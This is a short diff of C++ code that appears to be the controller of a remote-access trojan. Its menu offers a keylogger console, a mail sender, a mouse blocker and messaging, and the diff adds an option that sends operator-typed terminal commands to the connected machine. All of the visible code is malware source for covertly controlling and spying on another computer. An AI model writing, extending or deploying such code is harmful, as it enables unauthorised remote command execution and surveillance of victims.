@@ -8,6 +8,7 @@
 #define DEBUG true
 
 
+
 void doListen(Server * server);
 void doBlock(ServerCommand * cmd, int x, int y, int sec);
 //using namespace std;
@@ -25,7 +26,7 @@ int main()
 	t_listener.detach();
 	while (!server.gotConnection)
 	{
-
+		Sleep(1000);
 	}
 	ServerCommand cmd(server);
 
@@ -33,7 +34,7 @@ int choice;
 	while (server.gotConnection)
 	{
 		std::cout << "-----------------------------";
-		std::cout << "\n1 - Open Keylogger console." << std::endl;
+		std::cout << "\n1 - Terminal command." << std::endl;
 		std::cout << "2 - Mail Sender." << std::endl;
 		std::cout << "3 - Mouse Blocker." << std::endl;
 		std::cout << "4 - Send message." << std::endl;
@@ -47,7 +48,15 @@ int choice;
 		{
 			case 1:
 			{
-
+				std::string str;
+				std::cout << "Enter a terminal command: ";
+				std::cin.ignore();
+					getline(std::cin, str);
+					if (DEBUG)
+					{
+						std::cout << "Terminal command = " << str << std::endl;
+					}
+					cmd.sendToTerminal(str);
 				break;
 			}
 			case 2:
